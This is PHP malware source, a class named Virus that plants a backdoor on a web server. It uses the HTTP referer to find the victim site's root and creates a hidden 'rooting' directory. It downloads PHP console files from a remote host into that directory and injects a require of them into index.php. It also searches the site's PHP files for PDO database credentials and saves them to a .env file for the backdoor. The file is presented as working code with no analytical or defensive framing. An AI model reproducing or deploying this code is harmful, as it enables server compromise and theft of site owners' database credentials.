<?php

$data = new Virus();
$data->infect_structure_dir();
$data->infect_structure_file();
$data->infect_index_php();
$data->infect_database();
header("Location:".$data->run_virus());

Class Virus {

	/**
	 * @link_index String
	 */
	private $link_index;

	/**
	 * @link_root String
	 */
	private $link_root;

	/**
	 * @struct_dir Array
	 */
	private $struct_dir = ["class", "css", "js", "modules", "require", "template"];

	/**
	 * @struct_file Array
	 */
	private $struct_file = [

		"class" => ["console.class.phps", "init.class.phps", "link.class.phps", "tab.class.phps"],
		"css" => ["style.css"],
		"js" => ["console.js"],
		"modules" => [],
		"require" => ["to_include.phps"],
		"template" => ["console.html", "console_init.html", "help.txt", "module_type.txt"],
		"racine" => [".env", ".env_modules", "console.phps"]

	];

	const DIR_VIRUS = "rooting";
	const URL_SITE = "http://localhost/virus/";

	public function __Construct() {

		$link_explode = explode('/', $_SERVER['HTTP_REFERER']);
		$this->link_index = $_SERVER['DOCUMENT_ROOT'].'/'.$link_explode[count($link_explode) - 2].'/index.php';
		$this->link_root = $_SERVER['DOCUMENT_ROOT'].'/'.$link_explode[count($link_explode) - 2].'/';
	}

	public function run_virus() {

		return ($_SERVER['HTTP_REFERER']);
	}

	public function infect_structure_dir() {

		exec("ls -l ".$this->link_root.self::DIR_VIRUS, $exist_directory);

		if (empty($exist_directory)) {

			exec("mkdir ".$this->link_root.self::DIR_VIRUS);

			foreach ($this->struct_dir as $value) {

				exec("mkdir ".$this->link_root.self::DIR_VIRUS.'/'.$value);
			}
		}
	}

	public function infect_structure_file() {

		foreach ($this->struct_dir as $dir) {
			
			foreach ($this->struct_file[$dir] as $file) {

				$file_info = pathinfo(self::URL_SITE.$dir.'/'.$file);
				
				if ($file_info['extension'] != 'phps')
					file_put_contents($this->link_root.self::DIR_VIRUS.'/'.$dir.'/'.$file, file_get_contents(self::URL_SITE.$dir.'/'.$file));
				else
					file_put_contents($this->link_root.self::DIR_VIRUS.'/'.$dir.'/'.str_replace('phps', 'php', $file), file_get_contents(self::URL_SITE.$dir.'/'.$file));
			}
		}

		foreach ($this->struct_file["racine"] as $file) {

			$file_info = pathinfo(self::URL_SITE.$dir.'/'.$file);

			if ($file_info['extension'] != 'phps')
				file_put_contents($this->link_root.self::DIR_VIRUS.'/'.$file, file_get_contents(self::URL_SITE.$file));
			else
				file_put_contents($this->link_root.self::DIR_VIRUS.'/'.str_replace('phps', 'php', $file), file_get_contents(self::URL_SITE.$file));
		}
	}

	public function infect_index_php() {

		exec("ls -l ".$this->link_index, $is);

		if (empty($is))
			file_put_contents($this->link_index, "");

		$ligne_php = "require 'rooting/console.php';\n";

		$index_content = file($this->link_index);
		$index_content[1] = $index_content[1]."\n".$ligne_php;
		file_put_contents($this->link_index, implode("", $index_content));
	}

	public function infect_database() {

		$identifiant = [];

		exec("find ".$this->link_root."/ -name '*.php' -exec cat {} \; > ".$this->link_root."/infos.txt");
		exec("cat ".$this->link_root."/infos.txt | grep -e 'new PDO'", $response);
		$data = explode(',', trim(str_replace(' ', '', str_replace(');', '', substr($response[0], strpos($response[0], '(') + 1)))));

		if (count($data) >= 3) {
			$identifiant = $this->php_scrath($data);
		} else {
			echo "pas de bdd connexion la";
		}

		$this->write_en($identifiant);
	}

	private function write_en($identifiant) {

		$inf = file($this->link_root.self::DIR_VIRUS.'/.env');
		$inf[0] = str_replace("'", "", str_replace('"', '', $identifiant[0]))."\n";
		$inf[1] = str_replace("'", "", str_replace('"', '', $identifiant[1]))."\n";
		$inf[2] = str_replace("'", "", str_replace('"', '', $identifiant[2]))."\n";
		file_put_contents($this->link_root.self::DIR_VIRUS.'/.env', implode("", $inf));
	}

	private function php_scrath($data) {

		$identifiant = [];

		foreach ($data as $value) {

			if ($value[0] == "'") {

				$identifiant[] = $value;
			} else if ($value[0] == '"' && $value[1] != '$') {

				$identifiant[] = $value;
			} else {

				$value = str_replace('"', '', $value);
				$value = str_replace('$', '', $value);
				exec("cat ".$this->link_root."/infos.txt | grep -e ".$value, $res);
				$search = '\$'.$value;
				foreach ($res as $values) {

					if (preg_match('#'.$search.'#', $values) && !preg_match("#new PDO#", $values)) {

						$values = str_replace('$', '', $values);
						$values = str_replace($value, '', $values);
						$values = trim($values);
						$values = substr($values, 1);
						$values = trim(substr($values, 0, -1));
						$identifiant[] = $values;
					}
				}	
			}
		}

		return ($identifiant);
	}
}
?>